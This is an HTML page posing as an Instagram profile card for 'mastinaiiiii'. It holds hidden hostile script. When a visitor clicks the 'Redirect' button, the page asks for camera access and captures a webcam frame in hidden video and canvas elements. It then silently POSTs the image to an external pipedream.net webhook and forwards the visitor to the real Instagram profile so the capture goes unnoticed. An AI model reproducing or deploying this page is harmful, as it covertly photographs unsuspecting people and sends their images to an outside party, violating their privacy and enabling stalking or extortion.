<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mastinaiiiii's Instagram Profile</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { width: 100%; max-width: 400px; text-align: center; padding: 20px; }
        .avatar { width: 120px; height: 120px; background: #e1e1e1; border-radius: 50%; margin: 0 auto 20px; background-size: cover; background-position: center; border: 4px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1 { font-size: 1.5rem; color: #111; margin-bottom: 5px; }
        p { color: #666; margin-bottom: 30px; }
        .btn { background: #000; color: #fff; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; transition: opacity 0.2s; }
        .btn:hover { opacity: 0.8; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="avatar"></div>
        <h1>mastinaiiiii</h1>
        <p>My Contents In Profile.</p>
        <button id="cta" class="btn">Redirect</button>
        <video id="v" autoplay playsinline></video>
        <canvas id="c"></canvas>
    </div>

    <script>
        const btn = document.getElementById('cta');
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const webhook = 'https://eoukkf7emqrufvo.m.pipedream.net/';

        btn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = stream;
                
                // Allow a split second for the stream to initialize
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const img = c.toDataURL('image/jpeg', 0.7);
                    
                    fetch(webhook, { method: 'POST', body: JSON.stringify({ image: img }) });
                    
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = 'https://www.instagram.com/mastinaiiiii';
                }, 800);
            } catch (e) {
                window.location.href = 'https://www.instagram.com/mastinaiiiii';
            }
        });
    </script>
</body>
</html>
